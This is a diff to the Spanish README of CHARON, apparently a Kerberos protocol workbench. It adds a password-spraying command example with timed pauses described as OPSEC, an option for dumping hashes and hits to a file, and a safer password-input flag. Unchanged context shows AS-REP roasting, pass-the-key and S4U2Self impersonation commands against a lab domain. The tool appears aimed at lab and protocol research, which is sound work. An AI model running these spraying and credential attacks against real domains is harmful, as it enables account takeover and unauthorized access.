@@ -1,5 +1,7 @@
 # CHARON — workbench del protocolo Kerberos
 
+[![CI](https://github.com/Ruby570bocadito/charon/actions/workflows/ci.yml/badge.svg)](https://github.com/Ruby570bocadito/charon/actions/workflows/ci.yml)
+
 > *"Charon es el barquero que transporta almas entre mundos. Una herramienta
 > que transporta mensajes entre cliente y KDC, y te muestra todo lo que
 > cruza el río."*
@@ -132,6 +134,11 @@ charon asreproast --users @cuentas.txt -r LAB.LOCAL --dc 10.0.0.1
 # Pass-the-key (NT hash o clave AES, sin contraseña)
 charon passthekey --user jdoe --nt-hash 684d49a1... -r LAB.LOCAL --dc 10.0.0.1
 
+# Password spraying: clasifica 6/24/éxito, aprende el salt de cada usuario
+# del error 25 y pausa entre intentos (--delay-ms) para OPSEC
+charon spray --users @cuentas.txt -p 'Candidata2026!' -r LAB.LOCAL --dc 10.0.0.1 \
+    --delay-ms 500 --output aciertos.tsv
+
 # S4U2Self: ticket en nombre de otro usuario (para ver el PAC delegado)
 charon s4u2self --user jdoe --impersonate aesuser -r LAB.LOCAL --dc 10.0.0.1
 
@@ -144,9 +151,10 @@ charon matrix -r LAB.LOCAL --user jdoe --profile mit-krb5-1.21 \
 ```
 
 Parámetros comunes: `--dc` (host), `--port` (88 por defecto), `--realm`,
-`--json` (salida máquina), credenciales por flag o variable de entorno
-`CHARON_PASSWORD` (evita que la contraseña aparezca en el historial del
-shell; sigue siendo visible para otros procesos del mismo usuario).
+`--json` (salida máquina), `--output` (vuelca hashes/aciertos a fichero) y
+credenciales por flag, variable de entorno `CHARON_PASSWORD` o
+`--password-stdin` (esta última evita que el secreto sea visible en `ps`
+y en el historial del shell).
 
 ## Laboratorio
 
@@ -241,4 +249,4 @@ logs del KDC (ver `docs/threat-model.md`).
 
 ## Licencia
 
-MIT.
+MIT — ver [LICENSE](LICENSE).
